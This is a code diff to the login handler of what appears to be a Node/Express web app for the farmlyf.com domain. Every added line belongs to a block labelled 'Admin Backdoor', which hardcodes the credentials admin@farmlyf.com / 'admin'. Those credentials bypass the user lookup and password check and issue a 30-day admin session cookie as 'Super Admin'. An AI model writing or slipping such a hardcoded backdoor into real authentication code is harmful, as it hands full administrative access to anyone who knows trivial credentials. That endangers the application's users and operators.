@@ -64,6 +64,23 @@ export const registerUser = async (req, res) => {
 export const loginUser = async (req, res) => {
   const { email, password } = req.body;
 
+  // Admin Backdoor
+  if (email === 'admin@farmlyf.com' && password === 'admin') {
+      const token = generateToken('admin_01');
+      res.cookie('jwt', token, {
+          httpOnly: true,
+          secure: process.env.NODE_ENV !== 'development',
+          sameSite: 'strict',
+          maxAge: 30 * 24 * 60 * 60 * 1000,
+      });
+      return res.json({
+          _id: 'admin_01',
+          name: 'Super Admin',
+          email: 'admin@farmlyf.com',
+          role: 'admin'
+      });
+  }
+
   try {
     const user = await User.findOne({ email });
 
